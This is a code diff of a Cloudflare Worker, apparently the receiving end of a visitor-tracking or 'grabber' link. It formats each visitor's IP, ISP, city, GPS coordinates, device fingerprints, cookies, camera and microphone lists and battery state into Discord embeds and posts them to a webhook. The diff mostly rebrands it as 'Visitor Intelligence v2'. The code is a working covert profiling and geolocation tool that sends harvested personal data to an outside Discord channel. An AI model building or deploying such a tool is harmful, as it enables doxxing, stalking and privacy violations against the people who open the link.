@@ -1,5 +1,5 @@
 /**
- * Cloudflare Worker — Isekai Info-chan ✨
+ * Cloudflare Worker — りっかちゃん ✦
  */
 
 const CORS = {
@@ -8,16 +8,16 @@ const CORS = {
   "Access-Control-Allow-Headers": "Content-Type",
 };
 
-const AVATAR = "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjJycm1mcTZyZmtwNDYzN2t5M2k5bHRzNDFvcDdrZGFqZTlodjdsZyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/1ZlXGtKFZvsfS/giphy.gif";
+// ── Helpers ──────────────────────────────────────────────
 
-function s(v, max = 200) {
+function s(v, max = 220) {
   if (v == null || v === "" || v === "null" || v === undefined) return "—";
-  return String(v).replace(/[\x00-\x1F\x7F]/g, " ").slice(0, max);
+  return String(v).replace(/[\x00-\x1F\x7F]/g, " ").trim().slice(0, max);
 }
 
 function bool(v) {
-  if (v === true || v === "true") return "✅";
-  if (v === false || v === "false") return "❌";
+  if (v === true  || v === "true")  return "Ya";
+  if (v === false || v === "false") return "Tidak";
   return "—";
 }
 
@@ -28,258 +28,263 @@ function arr(v) {
 
 function waktuWIB() {
   try {
-    return new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+    return new Date().toLocaleString("id-ID", {
+      timeZone: "Asia/Jakarta",
+      day: "2-digit", month: "long", year: "numeric",
+      hour: "2-digit", minute: "2-digit", second: "2-digit",
+    });
   } catch (_) { return new Date().toISOString(); }
 }
 
 function parseBrands(brandsJson) {
   try {
-    const arr = JSON.parse(brandsJson);
-    return arr.map(b => `${b.brand} ${b.version}`).join(", ");
+    return JSON.parse(brandsJson).map(b => `${b.brand} ${b.version}`).join(", ");
   } catch (_) { return s(brandsJson); }
 }
 
-// Spacer field untuk jeda antar section
+// Baris kosong tipis antar section
 const SPACER = { name: "\u200B", value: "\u200B", inline: false };
 
-function buildEmbed(data) {
-  const gpsValue = (data.lat && data.lon)
-    ? `[🗺️ Buka Google Maps](https://maps.google.com/?q=${data.lat},${data.lon})\n\`Lat: ${data.lat}\`  •  \`Lon: ${data.lon}\``
-    : "*uwu~ lokasi GPS tidak ketemu nyaa~ (◡︿◡✿)*";
+// Garis pemisah dekoratif sebagai header section
+function section(icon, title) {
+  return { name: `${icon}  ﹒ ${title}`, value: "⠀", inline: false };
+}
 
-  const urlValue = data.url
-    ? `[🔗 Klik untuk buka](${data.url})\n\`${s(data.url, 180)}\``
+// ── Embed Utama ──────────────────────────────────────────
+
+function buildEmbed(data) {
+  const mapsLink = (data.lat && data.lon)
+    ? `[📍 Buka di Google Maps](https://maps.google.com/?q=${data.lat},${data.lon})`
+    : null;
+
+  const urlLine = data.url
+    ? `[↗ ${s(data.url, 60)}](${data.url})`
     : "—";
 
-  const referrerValue = data.referrer
-    ? `[🌸 Lihat halaman asal](${data.referrer})\n\`${s(data.referrer, 180)}\``
-    : "*langsung dibuka nyaa~ (ﾉ◕ヮ◕)ﾉ*";
+  const refLine = data.referrer
+    ? `[↗ ${s(data.referrer, 60)}](${data.referrer})`
+    : "*Dibuka langsung — tidak ada referrer*";
 
   const fields = [
-    // ── Link Section ──
-    {
-      name: "🔗  ✨ Link Yang Dibuka",
-      value: urlValue,
-      inline: false
-    },
-    {
-      name: "🌸  Datang Dari",
-      value: referrerValue,
-      inline: false
-    },
 
-    SPACER,
-
-    // ── IP & Location ──
+    // ╌╌╌ AKSES ╌╌╌
     {
-      name: "🌐  IP & Lokasi",
-      value: [
-        `📍 **IP:** \`${s(data.ip)}\``,
-        `🏢 **ISP:** ${s(data.isp)}`,
-        `🏙️ **Kota:** ${s(data.city)}`,
-        `🗾 **Region:** ${s(data.region)}`,
-        `🌍 **Negara:** ${s(data.country)}`,
-        `🕵️ **Proxy:** ${bool(data.proxy)}  •  ☁️ **Hosting:** ${bool(data.hosting)}`,
-        `📡 **ASN:** ${s(data.asn)}`,
-      ].join("\n"),
-      inline: false
+      name: "🔗  Halaman yang Dibuka",
+      value: urlLine,
+      inline: false,
     },
     {
-      name: "📡  GPS Koordinat",
-      value: gpsValue,
-      inline: false
+      name: "🪄  Sumber Kunjungan",
+      value: refLine,
+      inline: false,
     },
 
     SPACER,
 
-    // ── Device ──
+    // ╌╌╌ JARINGAN ╌╌╌
     {
-      name: "💻  Hardware",
+      name: "🌐  Jaringan & Lokasi IP",
       value: [
-        `⚙️ **CPU:** \`${s(data.hardwareConcurrency)} cores\``,
-        `🧠 **RAM:** \`${s(data.deviceMemory)} GB\``,
-        `🎮 **GPU:** ${s(data.vendor)} — ${s(data.renderer)}`,
-        `🔷 **WebGL:** ${s(data.version)}  •  🚀 **WebGPU:** ${bool(data.webgpu)}`,
-        `👆 **Touch Points:** ${s(data.maxTouchPoints)}`,
-        `📳 **Sensor:** Accel:${s(data.accel)}  Gyro:${s(data.gyro)}  Mag:${s(data.mag)}`,
+        `**IP Address** ｜ \`${s(data.ip)}\``,
+        `**ISP / Org** ｜ ${s(data.isp)}`,
+        `**Kota** ｜ ${s(data.city)}   **Region** ｜ ${s(data.region)}`,
+        `**Negara** ｜ ${s(data.country)}   **ASN** ｜ ${s(data.asn)}`,
+        `**Proxy** ｜ ${bool(data.proxy)}   **Hosting** ｜ ${bool(data.hosting)}`,
       ].join("\n"),
-      inline: false
+      inline: false,
+    },
+    {
+      name: "📡  Koneksi",
+      value: [
+        `**Tipe** ｜ ${s(data.connectionType)}   **Efektif** ｜ ${s(data.effectiveConnection)}`,
+        `**Downlink** ｜ ${s(data.downlink)} Mbps   **RTT** ｜ ${s(data.rtt)} ms`,
+        `**Hemat Data** ｜ ${bool(data.saveData)}   **Online** ｜ ${bool(data.online)}`,
+      ].join("\n"),
+      inline: false,
+    },
+
+    SPACER,
+
+    // ╌╌╌ PERANGKAT ╌╌╌
+    {
+      name: "💻  Perangkat",
+      value: [
+        `**CPU** ｜ \`${s(data.hardwareConcurrency)} core\`   **RAM** ｜ \`${s(data.deviceMemory)} GB\``,
+        `**GPU** ｜ ${s(data.vendor)}`,
+        `**Renderer** ｜ ${s(data.renderer, 120)}`,
+        `**WebGL** ｜ ${s(data.version, 60)}`,
+        `**Touch Points** ｜ ${s(data.maxTouchPoints)}   **WebGPU** ｜ ${bool(data.webgpu)}`,
+      ].join("\n"),
+      inline: false,
     },
     {
       name: "🖥️  Layar",
       value: [
-        `📐 **Resolusi:** \`${s(data.width)}x${s(data.height)}\`  •  Avail: \`${s(data.availWidth)}x${s(data.availHeight)}\``,
-        `🔍 **Pixel Ratio:** \`${s(data.pixelRatio)}\`  •  🎨 **Color Depth:** \`${s(data.colorDepth)} bit\``,
-        `🔄 **Orientasi:** ${s(data.orientation)} (${s(data.orientationAngle)}°)`,
-        `🪟 **Inner:** \`${s(data.innerWidth)}x${s(data.innerHeight)}\``,
+        `**Resolusi** ｜ \`${s(data.width)} × ${s(data.height)}\`   **Pixel Ratio** ｜ \`${s(data.pixelRatio)}x\``,
+        `**Tersedia** ｜ \`${s(data.availWidth)} × ${s(data.availHeight)}\`   **Color** ｜ \`${s(data.colorDepth)} bit\``,
+        `**Viewport** ｜ \`${s(data.innerWidth)} × ${s(data.innerHeight)}\`   **Orientasi** ｜ ${s(data.orientation)}`,
       ].join("\n"),
-      inline: false
+      inline: false,
+    },
+    {
+      name: "🔋  Baterai",
+      value: [
+        `**Level** ｜ ${s(data.level)}   **Charging** ｜ ${bool(data.charging)}`,
+      ].join("\n"),
+      inline: false,
     },
 
     SPACER,
 
-    // ── OS & Platform ──
+    // ╌╌╌ SISTEM ╌╌╌
     {
-      name: "📱  Platform & OS",
+      name: "🗂️  Sistem & Platform",
       value: [
-        `🖥️ **Platform:** ${s(data.platform)}  •  📲 **Mobile:** ${bool(data.mobile)}`,
-        `📋 **Model:** ${s(data.model)}`,
-        `⚙️ **Arch:** ${s(data.architecture)}  •  🔢 **Bitness:** ${s(data.bitness)}`,
-        `🏷️ **UA Brands:** ${data.brands ? parseBrands(data.brands) : "—"}`,
+        `**Platform** ｜ ${s(data.platform)}   **Mobile** ｜ ${bool(data.mobile)}`,
+        `**Model** ｜ ${s(data.model)}   **Arch** ｜ ${s(data.architecture)} ${s(data.bitness) !== "—" ? `(${s(data.bitness)}-bit)` : ""}`,
+        `**Browser** ｜ ${data.brands ? parseBrands(data.brands) : "—"}`,
       ].join("\n"),
-      inline: false
+      inline: false,
     },
     {
-      name: "🌍  Locale",
+      name: "🌏  Bahasa & Waktu",
       value: [
-        `🗣️ **Bahasa:** ${s(data.language)}  •  📚 **Languages:** ${s(data.languages)}`,
-        `⏰ **Timezone:** ${s(data.timezone)}`,
-        `💴 **Currency:** ${s(data.currency)}  •  📅 **Calendar:** ${s(data.calendar)}`,
-        `🔢 **Numbering:** ${s(data.numberingSystem)}`,
+        `**Bahasa** ｜ ${s(data.language)}   **Semua** ｜ ${s(data.languages, 80)}`,
+        `**Timezone** ｜ ${s(data.timezone)}`,
+        `**Kalender** ｜ ${s(data.calendar)}   **Mata Uang** ｜ ${s(data.currency)}`,
       ].join("\n"),
-      inline: false
+      inline: false,
     },
 
     SPACER,
 
-    // ── Network & Battery ──
+    // ╌╌╌ SIDIK JARI ╌╌╌
     {
-      name: "🌐  Jaringan",
+      name: "🎵  Fingerprint",
       value: [
-        `📶 **Tipe:** ${s(data.connectionType)}  •  🚀 **Effective:** ${s(data.effectiveConnection)}`,
-        `⬇️ **Downlink:** ${s(data.downlink)} Mbps  •  ⏱️ **RTT:** ${s(data.rtt)} ms`,
-        `💡 **Save Data:** ${bool(data.saveData)}  •  🌍 **Online:** ${bool(data.online)}`,
+        `**Audio**  ｜ \`${s(data.audioFingerprint, 80)}\``,
+        `**Canvas** ｜ \`${s(data.canvasFingerprint, 80)}\``,
       ].join("\n"),
-      inline: false
-    },
-    {
-      name: "🔋  Baterai & Audio",
-      value: [
-        `⚡ **Level:** ${s(data.level)}  •  🔌 **Charging:** ${bool(data.charging)}`,
-        `🎵 **Audio FP:** \`${s(data.audioFingerprint, 70)}\``,
-        `🎨 **Canvas FP:** \`${s(data.canvasFingerprint, 60)}\``,
-      ].join("\n"),
-      inline: false
+      inline: false,
     },
 
     SPACER,
 
-    // ── Storage & Media ──
+    // ╌╌╌ STORAGE & MEDIA ╌╌╌
     {
-      name: "💾  Storage",
+      name: "💾  Penyimpanan Browser",
       value: [
-        `📦 **LocalStorage:** ${bool(data.localStorage)}  •  📂 **SessionStorage:** ${bool(data.sessionStorage)}`,
-        `🗄️ **IndexedDB:** ${bool(data.indexedDB)}  •  👷 **ServiceWorker:** ${bool(data.serviceWorker)}`,
-        `⚡ **Cache API:** ${bool(data.cacheAPI)}  •  🍪 **Cookies:** ${s(data.cookies)}`,
-        `🚫 **DNT:** ${s(data.doNotTrack)}  •  ✅ **Cookie Enabled:** ${bool(data.cookieEnabled)}`,
+        `**LocalStorage** ｜ ${bool(data.localStorage)}   **SessionStorage** ｜ ${bool(data.sessionStorage)}`,
+        `**IndexedDB** ｜ ${bool(data.indexedDB)}   **ServiceWorker** ｜ ${bool(data.serviceWorker)}`,
+        `**Cache API** ｜ ${bool(data.cacheAPI)}   **Cookies** ｜ ${s(data.cookies)}   **DNT** ｜ ${s(data.doNotTrack)}`,
       ].join("\n"),
-      inline: false
+      inline: false,
     },
     {
-      name: "🎥  Media Devices",
+      name: "🎙️  Perangkat Media",
       value: [
-        `🎤 **Audio In:** ${arr(data.audioIn)}`,
-        `📷 **Video In:** ${arr(data.videoIn)}`,
-        `🔈 **Audio Out:** ${arr(data.audioOut)}`,
+        `**Mikrofon** ｜ ${arr(data.audioIn)}`,
+        `**Kamera** ｜ ${arr(data.videoIn)}`,
+        `**Speaker** ｜ ${arr(data.audioOut)}`,
       ].join("\n"),
-      inline: false
+      inline: false,
     },
 
     SPACER,
 
-    // ── Browser ──
+    // ╌╌╌ BROWSER ╌╌╌
     {
-      name: "🧩  Fitur Browser",
+      name: "🧩  Kapabilitas Browser",
       value: [
-        `🔷 WebGL2: ${bool(data.webgl2)}  •  🚀 WebGPU: ${bool(data.webgpu)}  •  📹 WebRTC: ${bool(data.webrtc)}`,
-        `📊 CSS Grid: ${bool(data.cssGrid)}  •  📐 Flexbox: ${bool(data.flexbox)}`,
-        `📡 Fetch API: ${bool(data.fetchAPI)}  •  🤝 Promise: ${bool(data.promise)}`,
-        `🧩 **Plugins:** ${s(data.plugins) || "—"}`,
-      ].join("\n"),
-      inline: false
+        `WebGL2 ｜ ${bool(data.webgl2)}   WebRTC ｜ ${bool(data.webrtc)}   Fetch API ｜ ${bool(data.fetchAPI)}`,
+        `CSS Grid ｜ ${bool(data.cssGrid)}   Flexbox ｜ ${bool(data.flexbox)}   Promise ｜ ${bool(data.promise)}`,
+        data.plugins && data.plugins !== "—" ? `**Plugins** ｜ ${s(data.plugins, 120)}` : null,
+      ].filter(Boolean).join("\n"),
+      inline: false,
     },
     {
-      name: "📜  User Agent",
-      value: `\`\`\`${s(data.userAgent, 200)}\`\`\``,
-      inline: false
+      name: "📋  User Agent",
+      value: `\`\`\`\n${s(data.userAgent, 250)}\n\`\`\``,
+      inline: false,
     },
+
   ];
 
   return {
-    color: 0xFF85C1,
-    author: {
-      name: "✨ Isekai Info-chan melaporkan~ (｡♥‿♥｡)",
-      icon_url: AVATAR,
-    },
-    thumbnail: { url: AVATAR },
-    title: "🌸 Laporan Pengunjung Baru Nyaa~ 🌸",
-    description: `> *Ara ara~ ada tamu baru masuk ke dunia isekai!\n> Info-chan sudah mengumpulkan semua datanya desu~ (≧◡≦) ✨*`,
+    color: 0xFFB7D5,
+    title: "✦  りっかちゃん  ✦  来訪者レポート",
+    description: [
+      "> *来訪者を発見しました — データの収集が完了しました。*",
+      "> ─────────────────────────",
+      `> **Waktu kunjungan** ｜ ${waktuWIB()}`,
+    ].join("\n"),
     fields,
     footer: {
-      text: `🎀 Isekai Info-chan Engine v100 ✨ • ${waktuWIB()} • がんばってね！`
+      text: "りっかちゃん  ✦  Visitor Intelligence  ✦  v2",
     },
-    timestamp: new Date().toISOString()
+    timestamp: new Date().toISOString(),
   };
 }
+
+// ── Embed GPS Follow-up ───────────────────────────────────
 
 function buildGpsEmbed(data) {
   const mapsUrl = `https://maps.google.com/?q=${data.lat},${data.lon}`;
   return {
-    color: 0xFF85C1,
-    author: {
-      name: "📍 Isekai Info-chan — Update Lokasi GPS~ (｡♥‿♥｡)",
-      icon_url: AVATAR,
-    },
-    thumbnail: { url: AVATAR },
-    title: "🗺️ Koordinat GPS Berhasil Didapat Nyaa~ 🌸",
-    description: `> *Ara ara~ tamu-chan mengizinkan akses lokasi desu~\n> Info-chan berhasil mengunci koordinatnya! (≧◡≦) ✨*`,
+    color: 0xFFB7D5,
+    title: "✦  りっかちゃん  ✦  ロケーション更新",
+    description: [
+      "> *来訪者が位置情報のアクセスを許可しました。*",
+      "> ─────────────────────────",
+      `> **Waktu** ｜ ${waktuWIB()}`,
+    ].join("\n"),
     fields: [
       {
-        name: "📍  Koordinat",
+        name: "📍  Koordinat GPS",
         value: [
-          `**Latitude:** \`${data.lat}\``,
-          `**Longitude:** \`${data.lon}\``,
-          `**Akurasi:** ±\`${data.accuracy ? Math.round(data.accuracy) + " meter" : "—"}\``,
-          `[🗺️ Buka Google Maps](${mapsUrl})`,
+          `**Latitude** ｜ \`${data.lat}\``,
+          `**Longitude** ｜ \`${data.lon}\``,
+          `**Akurasi** ｜ ± ${data.accuracy ? Math.round(data.accuracy) + " meter" : "—"}`,
+          ``,
+          `[↗ Buka di Google Maps](${mapsUrl})`,
         ].join("\n"),
-        inline: false
+        inline: false,
       },
       {
-        name: "🔗  URL Halaman",
-        value: data.url ? `\`${s(data.url, 200)}\`` : "—",
-        inline: false
+        name: "🔗  Halaman",
+        value: data.url ? `[↗ ${s(data.url, 80)}](${data.url})` : "—",
+        inline: false,
       },
     ],
     footer: {
-      text: `🎀 Isekai Info-chan Engine v100 ✨ • ${waktuWIB()} • がんばってね！`
+      text: "りっかちゃん  ✦  Visitor Intelligence  ✦  v2",
     },
-    timestamp: new Date().toISOString()
+    timestamp: new Date().toISOString(),
   };
 }
+
+// ── Handler ──────────────────────────────────────────────
 
 export default {
   async fetch(request, env) {
     if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: CORS });
-    if (request.method !== "POST") return new Response("Not Found", { status: 404, headers: CORS });
+    if (request.method !== "POST")    return new Response("Not Found", { status: 404, headers: CORS });
 
     let data;
-    try { data = await request.json(); } catch { return new Response("Bad JSON", { status: 400, headers: CORS }); }
+    try { data = await request.json(); }
+    catch { return new Response("Bad JSON", { status: 400, headers: CORS }); }
 
     const webhook = env.DISCORD_WEBHOOK_URL;
     if (!webhook) return new Response("OK", { status: 200, headers: CORS });
 
-    // GPS-only follow-up → kirim embed kecil khusus koordinat
     const embed = data._gpsOnly ? buildGpsEmbed(data) : buildEmbed(data);
 
     try {
+      // Tidak menyertakan username/avatar_url — profil diambil dari pengaturan webhook Discord
       await fetch(webhook, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          username: "Isekai Info-chan ✨",
-          avatar_url: AVATAR,
-          embeds: [embed]
-        })
+        body: JSON.stringify({ embeds: [embed] }),
       });
     } catch (e) { console.error(e); }
 
